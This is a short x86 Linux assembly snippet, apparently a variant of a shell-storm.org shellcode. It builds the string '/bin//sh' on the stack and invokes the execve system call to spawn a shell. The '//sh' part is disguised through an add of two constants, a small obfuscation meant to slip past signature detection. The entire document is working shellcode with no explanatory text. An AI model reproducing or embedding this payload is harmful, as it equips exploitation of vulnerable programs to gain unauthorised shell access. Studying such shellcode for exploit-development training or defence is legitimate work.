 ;http://shell-storm.org/shellcode/files/shellcode-752.php

 xor ecx, ecx
 push ecx
 
mov esi,0x57621e1e
add esi,0x11111111

mov dword[esp-4],esi
sub esp,4

mov dword[esp-4],0x6e69622f
sub esp,4

 mov ebx, esp
 mov al, 11
 int 0x80


